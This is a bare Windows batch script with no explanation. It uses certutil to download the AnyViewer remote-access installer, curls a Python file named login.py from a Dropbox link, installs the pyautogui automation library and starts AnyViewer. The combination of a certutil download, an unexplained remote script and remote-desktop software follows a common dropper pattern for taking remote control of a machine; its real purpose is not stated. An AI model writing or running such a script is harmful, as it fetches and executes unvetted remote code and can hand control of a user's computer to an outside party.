@echo off
certutil -urlcache -split -f "https://www.anyviewer.com/ss/download/AnyViewerSetup.exe" AnyViewer.exe
curl -L -o login.py https://www.dropbox.com/scl/fi/k18qc9drpe7nhli766fsb/login.py?rlkey=v96du1pl748xqkiqdc1qltr4r&
pip install pyautogui 
start AnyViewer.exe
